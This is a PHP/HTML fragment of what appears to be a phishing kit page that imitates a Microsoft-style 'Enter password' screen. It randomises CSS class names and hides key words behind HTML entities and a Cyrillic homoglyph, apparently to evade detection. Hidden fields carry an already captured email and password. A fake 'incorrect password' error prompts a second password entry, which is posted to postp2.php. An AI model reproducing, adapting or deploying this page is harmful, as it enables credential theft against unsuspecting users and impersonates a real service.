...
<body class="<?php echo md5(uniqid(rand(), true)); ?> cb" data-bind="defineGlobals: ServerData, bodyCssClass">
	<div>
		<div class="<?php echo md5(uniqid(rand(), true)); ?> background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
			...
			<form  novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="postp2.php">
			...
			<div role="main" >
				<div class="">
					...
					<div class="<?php echo md5(uniqid(rand(), true)); ?> pagination-view animate has-identity-banner slide-in-next" >
						<input name="loglagi" value="<?php echo $email; ?>" type="hidden">
						<input name="rahasia1" value="<?php echo $pswd1; ?>" type="hidden">
						...
						<div id="loginHeader" class="row text-title" role="heading" aria-level="1" >Enter &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64;</div>
							<div class="<?php echo md5(uniqid(rand(), true)); ?> row"> 
								<div class="<?php echo md5(uniqid(rand(), true)); ?> form-group col-md-24"> 
									...
									<div id="passwordError" class="<?php echo md5(uniqid(rand(), true)); ?> alert alert-error" >Your &#x61;&#99;&#x63;&#111;&#x75;&#110;&#x74; or &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64; is &#105;&#x6E;&#99;&#x6F;&#114;&#x72;&#101;&#x63;&#116;. If &#121;&#x6F;&#117; don't remember &#121;&#x6F;&#117;&#x72; &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64;, <a id="idA_IL_ForgotPassword0" href="#">&#114;&#x65;&#115;&#101;&#x74; &#105;&#x74; now.</a></div></div>
									
									<div class="placeholderContainer" >
										<input name="rahasia2" id="i0118" required="" autocomplete="off" autofocus="" class="<?php echo md5(uniqid(rand(), true)); ?> form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="P&#1072;ssword" aria-label="Enter the &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64; for <?php echo $email; ?>" type="password">
									</div> 
								</div> 
							</div>
